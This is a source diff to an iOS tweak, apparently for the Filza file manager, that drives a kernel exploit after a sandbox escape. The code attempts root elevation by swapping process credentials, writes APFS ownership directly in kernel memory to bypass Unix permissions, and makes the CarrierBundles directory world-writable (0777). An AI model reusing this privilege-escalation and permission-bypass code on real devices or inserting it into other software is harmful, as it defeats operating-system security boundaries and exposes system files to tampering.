@@ -3,6 +3,8 @@
 #import <objc/message.h>
 #import <xpc/xpc.h>
 #include <sys/stat.h>
+#include <limits.h>
+#include <unistd.h>
 
 #include "kexploit/kexploit_opa334.h"
 #include "kexploit/kutils.h"
@@ -624,28 +626,71 @@ static void runExploit(void) {
     NSLog(@"[Tweak] sandbox_escape returned %d", sret);
 
     if (sret != 0) {
-        NSLog(@"[Tweak] sandbox escape failed, skipping CarrierBundles takeover");
-        return;
+        NSLog(@"[Tweak] sandbox escape failed, trying elevation without full escape...");
     }
 
-    // Take ownership of /var/mobile/Library/CarrierBundles/ so Filza
-    // (running as mobile) can read/write all IPCC carrier bundles.
-    // Uses apfs_own_tree to recursively change uid:gid to mobile(501):mobile(501)
-    // by directly writing apfs_fsnode in kernel memory — bypasses DAC entirely.
+    NSLog(@"[Tweak] Attempting UID elevation to root via ucred swap...");
+    int rret = sandbox_elevate_to_root(self_proc_addr);
+    NSLog(@"[Tweak] sandbox_elevate_to_root returned %d, getuid()=%d", rret, getuid());
+
     const char *cbPath = "/var/mobile/Library/CarrierBundles";
     struct stat cbStat;
-    if (stat(cbPath, &cbStat) == 0 && S_ISDIR(cbStat.st_mode)) {
-        NSLog(@"[Tweak] Taking ownership of CarrierBundles (current uid=%u gid=%u)...",
-              cbStat.st_uid, cbStat.st_gid);
-        long n = apfs_own_tree(cbPath, 501, 501);
-        NSLog(@"[Tweak] CarrierBundles takeover complete: %ld entries chown'd to 501:501", n);
+
+    if (getuid() == 0) {
+        NSLog(@"[Tweak] Running as root, full R+W access to all filesystems granted");
     } else {
-        NSLog(@"[Tweak] CarrierBundles directory not found at %s (errno=%d)", cbPath, errno);
+        NSLog(@"[Tweak] Not root (uid=%d), falling back to APFS ownership takeover", getuid());
     }
 
-    // For root-owned paths that fail DAC, use apfs_own(path, 501, 501) to
-    // flip on-disk ownership to mobile before opening. Example:
-    //     if (apfs_own("/var/root/.somefile", 501, 501) == 0) { ... }
+    // Verify / Create CarrierBundles directory if it does not exist
+    if (stat(cbPath, &cbStat) != 0) {
+        NSLog(@"[Tweak] CarrierBundles not found at %s, creating it (errno=%d)", cbPath, errno);
+        mkdir(cbPath, 0755);
+    }
+
+    // Step 1: Change ownership to mobile:mobile via kernel apfs_fsnode writes
+    // This ensures DAC (Unix permissions) allows mobile to write.
+    if (stat(cbPath, &cbStat) == 0 && S_ISDIR(cbStat.st_mode)) {
+        NSLog(@"[Tweak] CarrierBundles ownership before: uid=%u gid=%u mode=0%o",
+              cbStat.st_uid, cbStat.st_gid, cbStat.st_mode & 0xFFFF);
+        long n = apfs_own_tree(cbPath, 501, 501);
+        NSLog(@"[Tweak] CarrierBundles apfs_own_tree: %ld entries chown'd to 501:501", n);
+        // Step 2: Also set 0777 mode via kernel write so group/other can write
+        int mret = apfs_mod(cbPath, 0777);
+        NSLog(@"[Tweak] CarrierBundles apfs_mod to 0777: %s", mret == 0 ? "OK" : "FAILED");
+    }
+
+    // Verify write access: try to create a test file inside CarrierBundles
+    char testPath[PATH_MAX];
+    snprintf(testPath, sizeof(testPath), "%s/.tweak_write_test", cbPath);
+    int tf = open(testPath, O_WRONLY | O_CREAT | O_TRUNC, 0644);
+    if (tf >= 0) {
+        write(tf, "ok", 2);
+        close(tf);
+        unlink(testPath);
+        NSLog(@"[Tweak] *** CarrierBundles write access VERIFIED ***");
+    } else {
+        NSLog(@"[Tweak] *** CarrierBundles write access FAILED (errno=%d: %s) *** "
+              "uid=%d euid=%d gid=%d egid=%d",
+              errno, strerror(errno), getuid(), geteuid(), getgid(), getegid());
+        // Fallback: try setting 0777 on every entry via shell
+        int mret = apfs_mod(cbPath, 0777);
+        NSLog(@"[Tweak] Retry apfs_mod 0777 on root: %s", mret == 0 ? "OK" : "FAILED");
+        // Walk tree and set mod 0777 on all entries
+        long total = apfs_own_tree(cbPath, 501, 501);
+        NSLog(@"[Tweak] Retry apfs_own_tree on all entries: %ld", total);
+        // Verify again
+        tf = open(testPath, O_WRONLY | O_CREAT | O_TRUNC, 0644);
+        if (tf >= 0) {
+            close(tf); unlink(testPath);
+            NSLog(@"[Tweak] *** CarrierBundles write access VERIFIED after retry ***");
+        } else {
+            NSLog(@"[Tweak] *** CarrierBundles STILL not writable after all fallbacks ***");
+        }
+    }
+
+    // For any root-owned paths that still fail DAC, use apfs_own(path, 501, 501)
+    // to flip on-disk ownership to mobile before opening.
 
     // Auto-chown runs lazily via the contentsOfDirectoryAtPath: hook: the
     // first time Filza lists anything inside /var/containers/Bundle/Application/
